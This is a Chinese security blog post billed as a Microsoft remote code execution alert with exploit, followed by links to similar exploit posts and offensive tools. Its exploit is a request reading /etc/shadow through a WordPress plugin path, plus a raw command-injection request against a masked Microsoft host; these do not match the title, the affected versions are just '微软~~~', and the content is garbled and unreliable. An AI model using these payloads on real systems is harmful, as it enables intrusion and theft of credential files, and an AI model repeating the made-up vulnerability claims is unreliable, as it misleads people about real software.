#  漏洞速递 | Microsoft微软最新RCE漏洞（附EXP）   
原创 AW  阿无安全   2024-04-26 06:02  
  
<table><tbody><tr><td width="557" valign="top" height="62" style="word-break: break-all;"><section style="margin-bottom: 15px;"><span style="font-size: 14px;"><span style="color: rgb(217, 33, 66);"><strong>声明：</strong></span>该公众号大部分文章来自作者日常学习笔记，也有部分文章是经过作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。</span><span style="font-size: 14px;letter-spacing: 0.034em;">请勿利用</span><span style="font-size: 14px;letter-spacing: 0.034em;">文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。</span></section></td></tr></tbody></table>  
现在只对常读和星标的公众号才展示大图推送，建议大家把  
**阿无安全**  
“  
设为星标  
”，  
否则可能看不到了  
！  
  
  
**0x01 前言**  
  
     
  
  
微软RCE  
。  
  
  
**0x02 漏洞影响**  
  
  
    影响版本  
```
微软~~~

```  
  
**0x03 漏洞复现**  
  
  
  
EXP如下：  
```
/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=/etc/shadow
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zHibqAQoXRahXbt4JxhDdXfvXYfnQMgNNFFZuMfsyohHrIL0TnDpqm8iaLRQ1x50yClicibBLWV8bdyQLibL8zwdw1g/640?wx_fmt=png&from=appmsg "")  
```
GET /pages/systemcall.php?command=id HTTP/1.1
Host: ***.microsoft.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Accept: */*
Origin: chrome-extension://bhimnoepicmcjfkbmhckamllnibadfal
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close


```  
  
**success！**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zHibqAQoXRahXbt4JxhDdXfvXYfnQMgNNezlPLjjstKjOVbCLISE8fvvQyeBqibIYLTvfE909G5FHiaBCwwfujbcQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
**0x04 修复方案**  
  
****```
请升级最新版本。 
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ib745vqibLBGIeAicnHiag9GCzTYjeicic5IWPqfyjLajDuwtJdNCAnCgcolqY8ROaE5CsEXR5zbjCU9aVl3WfkZpnDw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
往期推荐 · 值得阅看  
  
[CVE-2023-2317 RCE漏洞](http://mp.weixin.qq.com/s?__biz=MzkwMTUzNDgxOA==&mid=2247483981&idx=1&sn=39fe7a4494fac9b0b5956f70756c13d3&chksm=c0b20740f7c58e563e7e965e3087b806777a1213e6bbcb639f9852c60ea51bf26be97bcfdf6a&scene=21#wechat_redirect)  
  
  
[苕皮期间~致远OA 0day漏洞](http://mp.weixin.qq.com/s?__biz=MzkwMTUzNDgxOA==&mid=2247484010&idx=1&sn=960515c7cb4a2d0ec047c91748f40495&chksm=c0b20767f7c58e7102b9c617cf7686ad17ae942d6ac5abc611ef09241c504f27f43213dfd8b0&scene=21#wechat_redirect)  
  
  
[苕皮期间~用友Nday漏洞（附EXP）](http://mp.weixin.qq.com/s?__biz=MzkwMTUzNDgxOA==&mid=2247483931&idx=1&sn=61b6410e6f9d1a245e85708889bead5b&chksm=c0b20716f7c58e00501258bade789dcf7167673f282865e24f81be41e6a31d3f245a4c6dd1d2&scene=21#wechat_redirect)  
  
  
[CVE-2023-3450 RCE漏洞（附EXP）](http://mp.weixin.qq.com/s?__biz=MzkwMTUzNDgxOA==&mid=2247484037&idx=1&sn=acebf911f8303db77877b48cdc84d9d1&chksm=c0b20788f7c58e9edc4e6bbc70fb2c2a33473f8e8cf64b4d52c0061c771cb485b702b2b55e35&scene=21#wechat_redirect)  
  
  
[CVE-2023-6895 RCE漏洞（附EXP）](http://mp.weixin.qq.com/s?__biz=MzkwMTUzNDgxOA==&mid=2247484324&idx=1&sn=78f5c6de38555869f71ec618fc8fdc4f&chksm=c0b206a9f7c58fbf4ea5f65e0711f9aa7d3714237b55edf6def9d6c5945b69a985ddce816858&scene=21#wechat_redirect)  
  
  
[CVE-2023-26469 RCE漏洞（附EXP）](http://mp.weixin.qq.com/s?__biz=MzkwMTUzNDgxOA==&mid=2247484030&idx=1&sn=f457c979e0f01ad991b9287aaa24d604&chksm=c0b20773f7c58e65ead3e92141ab7f55af292b8c783ff1ae79cdffc9ace0fdafebb0893ed134&scene=21#wechat_redirect)  
  
  
[XVE-2023-23743 RCE漏洞（附EXP）](http://mp.weixin.qq.com/s?__biz=MzkwMTUzNDgxOA==&mid=2247484142&idx=1&sn=c1d0a8338093b459469dd83476b9daed&chksm=c0b207e3f7c58ef5ea6fdb159b871cf6d837bbe1f762b0221a718c2d1718c3db70d213d7c034&scene=21#wechat_redirect)  
  
  
[CVE-2023-4120 某设备注入漏洞（附EXP）](http://mp.weixin.qq.com/s?__biz=MzkwMTUzNDgxOA==&mid=2247484052&idx=1&sn=8aec1c2d9eb9554a8cf5f3f5672c254f&chksm=c0b20799f7c58e8f800dbfbbe83728790b87e9042b29409ef9bab58d38176aef90ec6c737727&scene=21#wechat_redirect)  
  
  
[CVE-2023-4450 | JeecgBoot RCE漏洞（附EXP）](http://mp.weixin.qq.com/s?__biz=MzkwMTUzNDgxOA==&mid=2247483689&idx=1&sn=a2c3e62fc0cd256106d5b60fce9760ea&chksm=c0b20424f7c58d3242a3d8766f9a0fd033de6ecb016431376eee83421e529eb209530f3e84ae&scene=21#wechat_redirect)  
  
  
[CVE-2023-49070 XML-RPC代码执行漏洞（附EXP）](http://mp.weixin.qq.com/s?__biz=MzkwMTUzNDgxOA==&mid=2247484315&idx=1&sn=f2dec378f96ae1b314630abad73de2a8&chksm=c0b20696f7c58f80fe76db3e2f4ea2f3c9fd0d1a71a18f0081d59b810b69beb8425a7358bd92&scene=21#wechat_redirect)  
  
  
[NB！分享一款神器 Linux权限维持Tools（附下载）](http://mp.weixin.qq.com/s?__biz=MzkwMTUzNDgxOA==&mid=2247483986&idx=1&sn=bf1edbbf2c6544ae32c2f477d21b3baa&chksm=c0b2075ff7c58e49256b13f051beee5599a845e5d10aead29b489ae4792cce08d0902414a62e&scene=21#wechat_redirect)  
  
  
[分享一款WEB界面的高仿CobaltStrike C2远控Tools（附下载）](http://mp.weixin.qq.com/s?__biz=MzkwMTUzNDgxOA==&mid=2247483998&idx=1&sn=4315e04ad5199ca667801160d6ed172d&chksm=c0b20753f7c58e456244481c639ed47742ca6def86bf03d6f73127bf022baabeeb7b8d079501&scene=21#wechat_redirect)  
  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/kuIKKC9tNkAfZibz9TQ8KWj4voxxxNSGMAGiauAWicdDiaVl8fUJYtSgichibSzDUJvsic9HUfC38aPH9ia3sopypYW8ew/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=wxpic "")  
  
